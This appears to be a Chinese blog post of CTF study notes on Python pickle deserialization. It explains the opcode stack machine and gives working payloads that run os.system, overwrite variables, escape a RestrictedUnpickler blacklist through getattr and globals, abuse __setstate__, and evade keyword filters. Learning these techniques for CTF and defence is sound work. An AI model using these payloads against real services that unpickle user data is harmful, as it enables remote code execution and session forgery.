---
title: pickle
date: 2023-10-20 16:28:06
categories:
- 网络安全
tags:
- web 
- python
description: |
    picpic
---

## pickle

> 首先要注意的是:pickle在Windows和Linux下的执行结果并不相同
>
> Linux(posix):
>
> `b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.`
>
> Windows(nt)：
> `b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.`

`pickle`实际上可以看作一种**独立的语言**，通过对`opcode`的编写可以进行`Python`代码执行、覆盖变量等操作。直接编写的`opcode`灵活性比使用`pickle`序列化生成的代码更高，并且有的代码不能通过`pickle`序列化得到（`pickle`解析能力大于`pickle`生成能力）

永远不要`unpickle`不受信数据

事先说明,Linux和windows下pickle生成的数据是不一样的

### pickle模块常见方法及接口

`pickle.dump(_obj_, _file_, _protocol=None_, _*_, _fix_imports=True_)`

将打包好的对象 _obj_ 写入文件中，其中protocol为pickling的协议版本（下同）。

`pickle.dumps(_obj_, _protocol=None_, _*_, _fix_imports=True_)`

将 _obj_ 打包以后的对象作为`bytes`类型直接返回。

`pickle.load(_file_, _*_, _fix_imports=True_, _encoding="ASCII"_, _errors="strict"_)`

从文件中读取二进制字节流，将其反序列化为一个对象并返回。

`pickle.loads(_data_, _*_, _fix_imports=True_, _encoding="ASCII"_, _errors="strict"_)[](https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.loads)`

从data中读取二进制字节流，将其反序列化为一个对象并返回。

`object.__reduce__()`

`__reduce__()`其实是object类中的一个魔术方法，我们可以通过重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行。

Python要求该方法返回一个字符串或者元组。如果返回元组`(callable, ([para1,para2...])[,...])` ，那么每当该类的对象被反序列化时，该`callable`就会被调用，参数为`para1、para2...`

### pickle反序列化

工作原理

其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的

PVM由以下三部分组成

- 指令处理器：从流中读取 `opcode` 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。
- stack：由 Python 的 **`list`** 实现，被用来临时存储数据、参数以及对象。
- memo：由 Python 的 **`dict`** 实现，为 PVM 的整个生命周期提供存储。

![[Pasted image 20231116014023.png]]

当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。

- v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。
- v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。
- v2 版协议是在 Python 2.3 中引入的。它为存储 [new-style class](https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class) 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 [**PEP 307**](https://www.python.org/dev/peps/pep-0307)。
- v3 版协议添加于 Python 3.0。它具有对 [`bytes`](https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes) 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。
- v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 [**PEP 3154**](https://www.python.org/dev/peps/pep-3154)。

**pickle协议是向前兼容的**，0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。下面我们以V0版本为例，介绍一下常见的opcode

#### 常用opcode

|指令|描述|具体写法|栈上的变化|
|---|---|---|---|
|c|获取一个全局对象或import一个模块|c[module]\n[instance]\n|获得的对象入栈|
|o|寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）|o|这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈|
|i|相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）|i[module]\n[callable]\n|这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈|
|N|实例化一个None|N|获得的对象入栈|
|S|实例化一个字符串对象|S'xxx'\n（也可以使用双引号、\'等python字符串形式）|获得的对象入栈|
|V|实例化一个UNICODE字符串对象|Vxxx\n|获得的对象入栈|
|I|实例化一个int对象|Ixxx\n|获得的对象入栈|
|F|实例化一个float对象|Fx.x\n|获得的对象入栈|
|R|选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数|R|函数和参数出栈，函数的返回值入栈|
|.|程序结束，栈顶的一个元素作为pickle.loads()的返回值|.|无|
|(|向栈中压入一个MARK标记|(|MARK标记入栈|
|t|寻找栈中的上一个MARK，并组合之间的数据为元组|t|MARK标记以及被组合的数据出栈，获得的对象入栈|
|)|向栈中直接压入一个空元组|)|空元组入栈|
|l|寻找栈中的上一个MARK，并组合之间的数据为列表|l|MARK标记以及被组合的数据出栈，获得的对象入栈|
|]|向栈中直接压入一个空列表|]|空列表入栈|
|d|寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）|d|MARK标记以及被组合的数据出栈，获得的对象入栈|
|}|向栈中直接压入一个空字典|}|空字典入栈|
|p|将栈顶对象储存至memo_n|pn\n|无|
|g|将memo_n的对象压栈|gn\n|对象被压栈|
|0|丢弃栈顶对象|0|栈顶对象被丢弃|
|b|使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置|b|栈上第一个元素出栈|
|s|将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中|s|第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新|
|u|寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中|u|MARK标记以及被组合的数据出栈，字典被更新|
|a|将栈的第一个元素append到第二个元素(列表)中|a|栈顶元素出栈，第二个元素（列表）被更新|
|e|寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中|e|MARK标记以及被组合的数据出栈，列表被更新|import pickle
![[20200320230711-7972c0ea-6abc-1.gif]]

```python
import pickle
opcode=b'''cos
system
(S'whoami'
tR.'''
pickle.loads(opcode)
```

很好理解,首先导入模块`c[moudle]\n[instance]\n`,这里是`os.system`然后压入`MARK`,再讲字符串`whoami`压入栈,字节码为`t`找到上一个`MARK`,合并数据成元祖,通过字节码R执行`os.system('whoami')`,最后的`.`代表程序结束，将栈顶元素`os.system('ls')`作为返回值

#### 三种执行字节码

1. `R`
就是上面的那种

2. `i`：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）

    ```python
    opcode=b'''(S'whoami'
    ios
    system
    .'''
    ```

3. `o`：寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）

```python
opcode=b'''(cos
system
S'whoami'
o.'''
```

部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为`os.system()`，在部分Linux下则为`posix.system()`。

#### 实例化对象

```python
opcode=b'''c__main__
Person
(I18
S'Pickle'
tR.'''
```

#### 变量覆盖

在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份

假如session或token是以明文的方式进行存储的，我们就有可能通过变量覆盖的方式进行身份伪造
这个和那个`0xgame`的题很像

```python
#secret.py

secret="This is a key"
```

```python
opcode=b'''c__main__
secret
(S'secret'
S'Hack!!!'
db.'''
```

我们首先通过`c`来获取`__main__.secret`模块，然后将字符串`secret`和`Hack!!!`压入栈中，然后通过字节码`d`将两个字符串组合成字典`{'secret':'Hack!!!'}`的形式。由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量`secret="This is a key"`，是以`{'secret':'This is a key'}`形式存储的。最后再通过字节码b来执行`__dict__.update()`，即`{'secret':'This is a key'}.update({'secret':'Hack!!!'})`，因此最终secret变量的值被覆盖成了`Hack!!!`

### 工具-Pker

#### Pker可以做到什么

- 变量赋值：存到memo中，保存memo下标和变量名即可
- 函数调用
- 类型字面量构造
- list和dict成员修改
- 对象成员变量修改

#### 使用

pker最主要的有三个函数`GLOBAL()`、`INST()`和`OBJ()`

```python
GLOBAL('os', 'system')             =>  cos\nsystem\n
INST('os', 'system', 'ls')         =>  (S'ls'\nios\nsystem\n
OBJ(GLOBAL('os', 'system'), 'ls')  =>  (cos\nsystem\nS'ls'\no
```

示例

```python
#pker_test.py
 
i = 0
s = 'id'
lst = [i]
tpl = (0,)
dct = {tpl: 0}
system = GLOBAL('os', 'system')
system(s)
return
```

结果

```bash
#命令行下
$ python3 pker.py < pker_tests.py
 
b"I0\np0\n0S'id'\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR."
```

### 绕过

官方给的是重写`Unpickler.find_class()`方法,限制使用模块

#### 绕过RestrictedUnpickler限制

`for i in sys.modules['builtins'].__dict__:print(i)`遍历一下模块函数

![[Pasted image 20231116020611.png]]

假如内置函数中一些执行命令的函数也被禁用了，而我们仍想命令执行，那么漏洞的利用思路就类似于Python中的沙箱逃逸

```python

import pickle
import io
import builtins
 
class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
 
    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))
 
def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()
```

思路是沙箱逃逸

1. 代码没有禁用`getattr()`函数，`getattr`可以获取对象的属性值。因此我们可以通过`builtins.getattr(builtins,'eval')`的形式来获取eval函数接下来我们得构造出一个`builtins`模块来传给`getattr`的第一个参数，我们可以使用`builtins.globals()`函数获取builtins模块包含的内容.由于返回的结果是个字典，所以我们还需要获取`get()`函数

    最终构造的payload为`builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)`

    ```python
    opcode=b'''cbuiltins
    getattr
    (cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tR(cbuiltins
    globals
    )RS'__builtins__'
    tRS'eval'
    tR(S'__import__("os").system("whoami")'
    tR.
    '''
    ```

    利用工具的话

    ```python
    #payload.py
 
    #获取getattr函数
    getattr = GLOBAL('builtins', 'getattr')
    #获取字典的get方法
    get = getattr(GLOBAL('builtins', 'dict'), 'get')
    #获取globals方法
    golbals=GLOBAL('builtins', 'globals')
    #获取字典
    builtins_dict=golbals()
    #获取builtins模块
    __builtins__ = get(builtins_dict, '__builtins__')
    #获取eval函数
    eval=getattr(__builtins__,'eval')
    eval("__import__('os').system('whoami')")
    return
    ```

2. `pickle`了一个`pickle.loads()`,精彩

待续

#### 绕过R指令

使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。
就上文谈到的_i_,_o_,都可以

困了,先到这里

*b*指令

当PVM解析到`b`指令时执行`__setstate__`或者`__dict__.update()`

要存储对象的状态，就可以使用`__getstat__`和`__setstat__`方法。由于`pickle`同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄`open(file,'r')`

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop()
        #首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict
        inst = stack[-1]
        #获取该字典中键名为"__setstate__"的value
        setstate = getattr(inst, "__setstate__", None)
        #如果存在，则执行value(state)
        if setstate is not None:
            setstate(state)
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        #如果"__setstate__"为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        #如果__setstate__和__getstate__都没有设置，则加载默认__dict__
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
    dispatch[BUILD[0]] = load_build
```

如果我们将字典`{"__setstate__":os.system}`，压入栈中，并执行`b`字节码，，由于此时并没有`__setstate__`，所以这里b字节码相当于执行了`__dict__.update`，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行`b`字节码时，由于已经有了`__setstate__`，所以会将栈中字节码`b`的前一个元素当作`state`，执行`__setstate__(state)`，也就是`os.system(command)`

#### 绕过关键词过滤

- 利用V指令进行Unicode绕过
- 十六进制绕过
- 利用内置函数获取关键字

```python
b'''capp
admin
(S'secret'
I1
db0(capp
User
S"admin"
I1
o.'''

#过滤secret

b'''capp
admin
(Vsecr\u0065t
I1
db0(capp
User
S"admin"
I1
o.'''

#十六进制
b'''capp
admin
(S'\x73ecret'
I1
db0(capp
User
S"admin"
I1
o.'''
```

### reduce

```python
def __reduce__(self):
        return (exec,("global key;key=b'66666666666666666666666666666666'",))

```
